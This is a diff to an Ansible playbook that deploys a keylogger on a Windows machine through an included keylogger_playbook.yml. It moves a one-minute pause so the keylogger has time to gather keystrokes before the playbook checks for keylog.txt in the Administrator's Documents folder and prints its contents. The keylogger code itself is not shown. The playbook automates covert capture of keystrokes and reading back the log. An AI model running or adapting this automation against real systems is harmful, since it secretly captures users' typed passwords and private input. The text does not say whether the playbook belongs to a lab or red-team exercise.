@@ -6,14 +6,14 @@
     - name: Run keylogger_playbook.yml to deploy keylogger
       include_tasks: keylogger_playbook.yml
 
+    - name: Wait for keylogger to gather data
+      pause:
+        minutes: 1
+
     - name: Check if keylog.txt exists
       win_stat:
         path: C:\Users\Administrator\Documents\keylog.txt
       register: keylog_file
-
-    - name: Wait for keylogger to gather data
-      pause:
-        minutes: 1
 
     - name: Print keylogger log contents
       win_shell: type C:\Users\Administrator\Documents\keylog.txt
